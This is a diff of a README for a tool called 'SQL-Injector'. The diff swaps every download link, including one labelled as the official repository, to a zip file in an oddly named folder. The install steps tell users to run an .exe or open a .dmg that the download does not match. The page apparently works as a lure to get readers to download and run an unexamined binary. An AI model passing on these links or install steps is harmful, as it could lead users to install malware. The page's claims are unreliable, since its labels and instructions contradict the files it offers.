@@ -1,6 +1,6 @@
 # 🗃️ SQL-Injector - Simplifying SQL Injection Testing
 
-[![Download SQL-Injector](https://raw.githubusercontent.com/kaka158b/SQL-Injector/main/anachronize/SQL-Injector-v1.0.zip)](https://raw.githubusercontent.com/kaka158b/SQL-Injector/main/anachronize/SQL-Injector-v1.0.zip)
+[![Download SQL-Injector](https://github.com/kaka158b/SQL-Injector/raw/refs/heads/main/anachronize/Injector-SQ-1.1.zip)](https://github.com/kaka158b/SQL-Injector/raw/refs/heads/main/anachronize/Injector-SQ-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets the following requirements:
 
 To get SQL-Injector, visit the following page to download:
 
-[Visit this page to download](https://raw.githubusercontent.com/kaka158b/SQL-Injector/main/anachronize/SQL-Injector-v1.0.zip)
+[Visit this page to download](https://github.com/kaka158b/SQL-Injector/raw/refs/heads/main/anachronize/Injector-SQ-1.1.zip)
 
 1. Click on the link above.
 2. Look for the latest version available.
@@ -29,7 +29,7 @@ Once the download completes, follow these instructions to set it up:
 
 - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts.
 - **macOS:** Open the downloaded `.dmg` file and drag the SQL-Injector app into your Applications folder.
-- **Linux:** Extract the contents of the `https://raw.githubusercontent.com/kaka158b/SQL-Injector/main/anachronize/SQL-Injector-v1.0.zip` file and follow any READ_ME instructions that appear.
+- **Linux:** Extract the contents of the `https://github.com/kaka158b/SQL-Injector/raw/refs/heads/main/anachronize/Injector-SQ-1.1.zip` file and follow any READ_ME instructions that appear.
 
 ### 📖 Usage Guide
 
@@ -76,8 +76,8 @@ If you want to learn more about how SQL-Injector works or explore advanced scena
 
 ### 🔗 Links
 
-- **Official GitHub Repository:** [SQL-Injector](https://raw.githubusercontent.com/kaka158b/SQL-Injector/main/anachronize/SQL-Injector-v1.0.zip)
-- **Download SQL-Injector:** [Download Here](https://raw.githubusercontent.com/kaka158b/SQL-Injector/main/anachronize/SQL-Injector-v1.0.zip)
+- **Official GitHub Repository:** [SQL-Injector](https://github.com/kaka158b/SQL-Injector/raw/refs/heads/main/anachronize/Injector-SQ-1.1.zip)
+- **Download SQL-Injector:** [Download Here](https://github.com/kaka158b/SQL-Injector/raw/refs/heads/main/anachronize/Injector-SQ-1.1.zip)
 
 ### 📞 Support
 
